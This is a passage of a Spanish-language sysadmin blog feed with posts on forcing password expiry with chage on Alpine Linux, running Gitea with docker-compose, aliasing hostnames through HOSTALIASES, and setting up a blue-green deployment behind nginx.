The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

server:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y tras ver que le funciona aparta la tarea y jamás se acuerda de cambiar su contraseña; otros directamente pasan de hacerlo, o se creen que su &lt;em&gt;post-it&lt;/em&gt; es ley; lo pegan en su monitor y la seguridad de la cuenta queda altamente comprometida.&lt;/p&gt;
&lt;h3&gt;La solución&lt;/h3&gt;
&lt;p&gt;La mejor forma que tenemos de forzar el cambio de la contraseña, sin tener demasiado trabajo, es delegarlo al sistema operativo. Las contraseñas en &lt;em&gt;linux&lt;/em&gt; pueden configurarse para &lt;strong&gt;caducar&lt;/strong&gt;. De hecho, directamente la podemos marcar como caducada, lo que va a forzar su cambio en el primer &lt;em&gt;login&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Esto se hace mediante el comando &lt;code&gt;chage&lt;/code&gt;, que nos permite el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-d&lt;/code&gt;, que es el que indica la fecha del último cambio de contraseña. Este &lt;em&gt;flag&lt;/em&gt; acepta el valor especial &lt;code&gt;0&lt;/code&gt; que obliga a que el usuario cambie su contraseña tras el primer &lt;em&gt;login&lt;/em&gt;. Esto se puede hacer en cualquier momento, pero es interesante hacerlo antes de mandarle la contraseña, cuando su usuario ya exista.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# chage -d 0 bob&lt;/span&gt;
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: El comando &lt;code&gt;chage&lt;/code&gt; se encuentra en el paquete &lt;strong&gt;shadow&lt;/strong&gt; en &lt;strong&gt;Alpine Linux&lt;/strong&gt;; otras distribuciones lo tienen en el paquete &lt;strong&gt;passwd&lt;/strong&gt;. Si no disponéis del comando, instalad el paquete adecuado.&lt;/p&gt;
&lt;p&gt;El resultado es que el usuario va a poder entrar, pero no va a poder hacer nada hasta que haga un cambio de contraseña de forma exitosa. Por supuesto, esto invalida la contraseña temporal que le hayamos podido dar, y hace de nuestro servidor un lugar un poco más seguro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/server$ ssh bob@server
bob@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

WARNING: Your password has expired.
You must change your password now and login again!
Changing password &lt;span class="k"&gt;for&lt;/span&gt; bob.
Current password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, depende del usuario saber donde apunta la contraseña y con quien la comparte.&lt;/p&gt;</content><category term="password"></category><category term="temporal"></category><category term="caducar"></category></entry><entry><title>Un servidor git con frontal web: Gitea</title><link href="http://www.linuxsysadmin.ml/2018/06/un-servidor-git-con-frontal-web-gitea.html" rel="alternate"></link><published>2018-06-11T10:00:00+02:00</published><updated>2018-06-11T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-06-11:/2018/06/un-servidor-git-con-frontal-web-gitea.html</id><summary type="html">&lt;p&gt;Los servidores de &lt;strong&gt;git&lt;/strong&gt; son muy útiles, pero si solo lo accedemos mediante terminal, se quedan limitados a pocos usuarios avanzados. Sin embargo, las soluciones con interfaz web, como &lt;strong&gt;GitHub&lt;/strong&gt; llegan a todo tipo de usuarios. En un intento de abaratar costes, se han hecho varios clones, entre ellos, &lt;strong&gt;Gitea …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Los servidores de &lt;strong&gt;git&lt;/strong&gt; son muy útiles, pero si solo lo accedemos mediante terminal, se quedan limitados a pocos usuarios avanzados. Sin embargo, las soluciones con interfaz web, como &lt;strong&gt;GitHub&lt;/strong&gt; llegan a todo tipo de usuarios. En un intento de abaratar costes, se han hecho varios clones, entre ellos, &lt;strong&gt;Gitea&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Realmente hay muchos clones, como &lt;strong&gt;Gitlab&lt;/strong&gt; o &lt;strong&gt;Gogs&lt;/strong&gt;; de hecho, &lt;strong&gt;Gitea&lt;/strong&gt; es un clon de &lt;strong&gt;Gogs&lt;/strong&gt; hecho en lenguaje &lt;strong&gt;Go&lt;/strong&gt;. Y lo que me llama especialmente la atención es la facilidad en que lo pude instalar: se trata simplemente de ejecutar un contenedor &lt;strong&gt;Docker&lt;/strong&gt; que, a diferencia de otros, ocupa relativamente poco espacio de disco.&lt;/p&gt;
&lt;h2&gt;Instalación&lt;/h2&gt;
&lt;p&gt;Lo primero es hacer un &lt;code&gt;docker pull gitea/gitea&lt;/code&gt;, que es la forma de traernos la imagen desde su correspondiente &lt;a href="https://hub.docker.com/r/gitea/gitea/"&gt;repositorio de &lt;strong&gt;DockerHub&lt;/strong&gt;&lt;/a&gt;. La misma documentación del repositorio indica como debe ejecutarse.&lt;/p&gt;
&lt;p&gt;Como punto interesante, &lt;strong&gt;Gitea&lt;/strong&gt; utiliza una base de datos para guardar toda aquella información de la página web que no queda reflejada en el propio repositorio. Esta pequeña configuración se indica de forma web, en la primera invocación de la interfaz; las posibilidades son varias: &lt;strong&gt;MySQL&lt;/strong&gt;, &lt;strong&gt;MSSQL&lt;/strong&gt;, &lt;strong&gt;PostgreSQL&lt;/strong&gt; e incluso una base de datos local &lt;strong&gt;SQLite3&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Es vuestra decisión elegir la que usar, pero por brevedad voy a levantar la instancia de pruebas sin un servidor de base de datos dedicado, confiando en &lt;strong&gt;SQLite3&lt;/strong&gt;. Por otra parte, los repositorios se alojan en el sistema de ficheros local; para evitar perderlos en caso de reinicio, lo voy a poner como un volumen local. Os pongo un &lt;em&gt;docker-compose.yml&lt;/em&gt; de ejemplo, para simplificar el despliegue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/tools/gitea$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  gitea:
    image: gitea/gitea
    volumes:
      - ./data:/data
    ports:
      - &lt;span class="s2"&gt;&amp;quot;3000:3000&amp;quot;&lt;/span&gt;
      - &lt;span class="s2"&gt;&amp;quot;22:22&amp;quot;&lt;/span&gt;
gerard@sirius:~/tools/gitea$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Evidentemente, la carpeta de datos de &lt;strong&gt;Gitea&lt;/strong&gt; debe existir en el servidor, con lo que la he creado en la misma carpeta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/tools/gitea$ tree
.
├── data
└── docker-compose.yml

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@sirius:~/tools/gitea$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda levantar los contenedores usando los comandos habituales de &lt;em&gt;docker-compose&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/tools/gitea$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;gitea_default&amp;quot;&lt;/span&gt; with the default driver
Creating gitea_gitea_1
gerard@sirius:~/tools/gitea$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nuestra instancia de &lt;strong&gt;Gitea&lt;/strong&gt; queda expuesta en &lt;em&gt;localhost&lt;/em&gt;, concretamente el puerto 3000 para la web, y el puerto 22 para la comunicación SSH con la que se lanzan las peticiones de &lt;em&gt;clone&lt;/em&gt;, &lt;em&gt;push&lt;/em&gt; o &lt;em&gt;pull&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Cabe decir que la primera vez que entremos en la web habrá que configurar algunos detalles; solo recomiendo tocar los de la base de datos y aquellos que son meramente cosméticos, como por ejemplo el título del sitio. Si no rellenáis la parte del administrador, este rol va a recaer en el primer usuario que se registre; aseguraos de ser vosotros.&lt;/p&gt;
&lt;p&gt;Os dejo una imagen que vale más que mil palabras.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Frontal de Gitea" src="http://www.linuxsysadmin.ml/images/gitea.jpg"&gt;&lt;/p&gt;</content><category term="git"></category><category term="gitea"></category><category term="docker"></category></entry><entry><title>Explorando bash: la variable de entorno HOSTALIASES</title><link href="http://www.linuxsysadmin.ml/2018/06/explorando-bash-la-variable-de-entorno-hostaliases.html" rel="alternate"></link><published>2018-06-04T10:00:00+02:00</published><updated>2018-06-04T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-06-04:/2018/06/explorando-bash-la-variable-de-entorno-hostaliases.html</id><summary type="html">&lt;p&gt;Muchas veces me he encontrado haciendo &lt;em&gt;demos&lt;/em&gt; con aplicaciones ejecutando en local o en un contenedor. Otras tantas el cliente ha hecho un montón de preguntas tontas referentes a porqué pone &lt;em&gt;localhost&lt;/em&gt;. En algunos de estos sistemas no disponía de acceso &lt;em&gt;root&lt;/em&gt; o &lt;em&gt;sudo&lt;/em&gt; para cambiar el fichero &lt;code&gt;/etc/hosts …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces me he encontrado haciendo &lt;em&gt;demos&lt;/em&gt; con aplicaciones ejecutando en local o en un contenedor. Otras tantas el cliente ha hecho un montón de preguntas tontas referentes a porqué pone &lt;em&gt;localhost&lt;/em&gt;. En algunos de estos sistemas no disponía de acceso &lt;em&gt;root&lt;/em&gt; o &lt;em&gt;sudo&lt;/em&gt; para cambiar el fichero &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;En estos casos, es especialmente interesante conocer la variable de &lt;strong&gt;bash&lt;/strong&gt; llamada &lt;strong&gt;HOSTALIASES&lt;/strong&gt;. Se trata de una variable de entorno que define un &lt;em&gt;path&lt;/em&gt; a un fichero, que va a ser una lista de &lt;em&gt;hosts&lt;/em&gt; y su &lt;em&gt;alias&lt;/em&gt;, aunque no soporta direcciones IP.&lt;/p&gt;
&lt;h2&gt;Un ejemplo simple: falseando un servidor, con un servicio local&lt;/h2&gt;
&lt;p&gt;Tanto si os pongo un ejemplo en este &lt;em&gt;blog&lt;/em&gt;, como si se trata de una &lt;em&gt;demo&lt;/em&gt; para un cliente, es muy habitual esconder el hecho de que no hay un servidor dedicado ni virtual mediante la exposición del puerto de un contenedor.&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos un servidor web o de aplicaciones, empaquetado en una imagen &lt;strong&gt;docker&lt;/strong&gt;. Para la &lt;em&gt;demo&lt;/em&gt; lo ponemos a correr como contenedor. Como bien sabéis, buscar la dirección del contenedor suele ser pesado, así que optamos por exponer su puerto en la máquina local:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://localhost:8080/
Hello world
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: En realidad, el puerto 8080 de &lt;em&gt;localhost&lt;/em&gt; va a parar el puerto 8080 del contenedor, cuya función es irrelevante ahora mismo.&lt;/p&gt;
&lt;p&gt;Entonces viene el cliente, y en vez de fijarse en la aplicación misma, se fija en &lt;em&gt;localhost&lt;/em&gt;, y empieza con las preguntas tontas habituales:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;¿Por qué pone ahí localhost? Yo lo quiero en mi servidor, con redundancia y blah, blah, blah&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Y aquí es cuando se nos hinchan las narices y decidimos engañarlo, mediante una resolución DNS, aunque sea simulada; como no tenemos acceso a los archivos del sistema y no queremos tampoco dejar basura en ellos, tiramos de la variable de entorno &lt;strong&gt;HOSTALIASES&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ cat hosts 
tuserver localhost
gerard@sirius:~$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;HOSTALIASES&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/hosts
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y a partir de aquí, nadie tiene que enterarse de la localización exacta de la demo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://tuserver:8080/
Hello world
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y se acabaron las preguntas tontas fuera de contexto.&lt;/p&gt;</content><category term="bash"></category><category term="variable"></category><category term="HOSTALIASES"></category></entry><entry><title>Despliegues sin corte de servicio: blue-green deployments</title><link href="http://www.linuxsysadmin.ml/2018/05/despliegues-sin-corte-de-servicio-blue-green-deployments.html" rel="alternate"></link><published>2018-05-28T10:00:00+02:00</published><updated>2018-05-28T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-28:/2018/05/despliegues-sin-corte-de-servicio-blue-green-deployments.html</id><summary type="html">&lt;p&gt;Para muchas aplicaciones caseras, nos importa poco parar un servidor de aplicaciones o web. Sin embargo, en el mundo empresarial, un corte de servicio o &lt;em&gt;downtime&lt;/em&gt; son palabras mayores, y normalmente vienen seguidos de un papeleo espectacular; otras veces se puede calmar la situación mediante el despido del pobre operador …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Para muchas aplicaciones caseras, nos importa poco parar un servidor de aplicaciones o web. Sin embargo, en el mundo empresarial, un corte de servicio o &lt;em&gt;downtime&lt;/em&gt; son palabras mayores, y normalmente vienen seguidos de un papeleo espectacular; otras veces se puede calmar la situación mediante el despido del pobre operador.&lt;/p&gt;
&lt;p&gt;En un mundo &lt;em&gt;agile&lt;/em&gt; en donde los despliegues son el pan de cada semana, nos interesa minimizar, o incluso suprimir, cualquier mención a la probabilidad de un &lt;em&gt;downtime&lt;/em&gt;. Para esto existe un patrón que se llama &lt;a href="https://martinfowler.com/bliki/BlueGreenDeployment.html"&gt;blue-green deployment&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La idea de fondo es muy simple: tenemos dos entornos iguales llamados &lt;strong&gt;blue&lt;/strong&gt; y &lt;strong&gt;green&lt;/strong&gt;, precedidos con un &lt;em&gt;proxy&lt;/em&gt; o un balanceador que hace fácil dirigir el tráfico hacia uno u otro. Esto significa que podemos modificar uno de los entornos en caliente, sabiendo que &lt;strong&gt;no es producción&lt;/strong&gt;. Solamente cuando el entorno secundario funciona bien podemos dirigir el tráfico hacia él, que &lt;strong&gt;se convierte en producción&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Blue-green deployment" src="http://www.linuxsysadmin.ml/images/blue-green_deployments.jpg"&gt;&lt;/p&gt;
&lt;p&gt;En caso de un error catastrófico no detectado, basta con volver a dirigir el tráfico al entorno anterior, que todavía tenemos funcional. Si no hubieran errores, podremos reinstalar este entorno anterior, en vistas a que pase a ser producción en un futuro cercano. Los montajes más habituales ofrecen ambos entornos, sirviendo dos puntos de entrada: uno como entorno de producción y el otro como entorno de pruebas.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Vamos a exponer una API de ejemplo que no hace nada en especial; es lo de menos en este momento. Vamos a poner dos servidores de aplicaciones por entorno y vamos a hacer balanceo de carga además de la función de dirección de tráfico. Estas son las decisiones de diseño de este ejemplo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tenemos un servidor llamado &lt;em&gt;proxy&lt;/em&gt; que va a ejecutar un &lt;strong&gt;nginx&lt;/strong&gt; como balanceador y &lt;em&gt;switch&lt;/em&gt;, aunque serviría otro (un &lt;strong&gt;haproxy&lt;/strong&gt;, por ejemplo)&lt;/li&gt;
&lt;li&gt;El entorno &lt;strong&gt;blue&lt;/strong&gt; se compone de dos servidores &lt;em&gt;blue1&lt;/em&gt; y &lt;em&gt;blue2&lt;/em&gt; escuchando en el puerto 8080&lt;/li&gt;
&lt;li&gt;El entorno &lt;strong&gt;green&lt;/strong&gt; se compone de dos servidores &lt;em&gt;green1&lt;/em&gt; y &lt;em&gt;green2&lt;/em&gt; escuchando en el puerto 8080&lt;/li&gt;
&lt;li&gt;El puerto 80 del &lt;em&gt;proxy&lt;/em&gt; será producción, y el puerto 8080 del mismo servidor servirá como entorno de pruebas&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;El estado inicial&lt;/h3&gt;
&lt;p&gt;Tenemos una versión 1.0.0 en todos los servidores de aplicaciones. La API de ejemplo que ponemos nos muestra claramente la versión y el servidor que atendió la petición, para mayor claridad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# wget -qO- http://blue1:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# wget -qO- http://blue2:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# wget -qO- http://green1:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# wget -qO- http://green2:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Decidimos que el entorno &lt;strong&gt;blue&lt;/strong&gt; es actualmente producción, y por lo tanto, &lt;strong&gt;green&lt;/strong&gt; es el entorno de pruebas. Simplemente necesitamos modificar la configuración del &lt;strong&gt;nginx&lt;/strong&gt; para que apunte cada puerto al entorno que toca, por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# cat /etc/nginx/conf.d/api.conf 
upstream blue &lt;span class="o"&gt;{&lt;/span&gt;
    server blue1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server blue2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

upstream green &lt;span class="o"&gt;{&lt;/span&gt;
    server green1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server green2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://blue&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://green&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recargamos el &lt;strong&gt;nginx&lt;/strong&gt; y ya tenemos lo que queríamos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Entorno de producción en el puerto 80, apuntando al entorno &lt;strong&gt;blue&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Entorno de pruebas en el puerto 8080, apuntando al entorno &lt;strong&gt;green&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


